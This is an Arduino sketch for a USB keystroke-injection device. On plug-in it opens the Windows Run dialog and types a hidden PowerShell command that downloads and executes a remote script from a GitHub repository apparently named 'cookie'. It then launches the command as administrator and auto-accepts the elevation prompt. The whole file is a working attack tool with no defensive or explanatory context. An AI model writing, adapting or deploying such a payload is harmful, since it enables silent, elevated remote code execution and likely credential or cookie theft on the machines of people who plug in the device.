void setup() { 
    delay(5000);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(500);

    Keyboard.print("powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('https://github.com/YcVoz/cookie/raw/master/ab.ps1');");
    delay(500);
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(2500);

    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press('y');  
    Keyboard.releaseAll();  
    delay(1500);

 }

void loop() {}
